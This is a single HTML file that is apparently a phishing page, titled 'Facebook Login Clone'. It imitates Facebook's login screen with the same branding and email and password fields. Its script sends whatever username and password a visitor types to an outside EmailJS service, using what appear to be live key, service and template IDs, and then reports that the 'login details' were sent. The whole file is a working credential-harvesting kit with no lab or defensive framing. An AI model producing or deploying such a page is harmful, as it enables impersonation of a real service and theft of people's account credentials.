<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login Clone</title>
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <link rel="stylesheet" href="style.css">
    <style>
       
    </style>
</head>
<body>
    <div class="container">
        <div class="left-section">
            <h1>facebook</h1>
            <p>Connect with friends and the world around you on Facebook.</p>
        </div>
        <div class="login-box">
            <form id="login-form">
                <input type="text" id="username" placeholder="Email or phone number" required>
                <input type="password" id="password" placeholder="Password" required>
                <button type="submit">Log In</button>
            </form>
            <a href="#" class="forgot-link">Forgot password?</a>
        </div>
    </div>

    <script>
        emailjs.init("a4myD0mn7J2nu5DeB"); // Replace with your Public Key
    
        document.getElementById("login-form").addEventListener("submit", function(event) {
            event.preventDefault();
    
            emailjs.send("service_1n0dtkj", "template_4706myi", {
                username: document.getElementById("username").value,  // Match EmailJS variable
                password: document.getElementById("password").value   // Match EmailJS variable
            })
            .then(function(response) {
                alert("Login details sent successfully!");
            }, function(error) {
                alert("Failed to send login details. Try again!");
            });
        });
    </script>
</body>
</html>
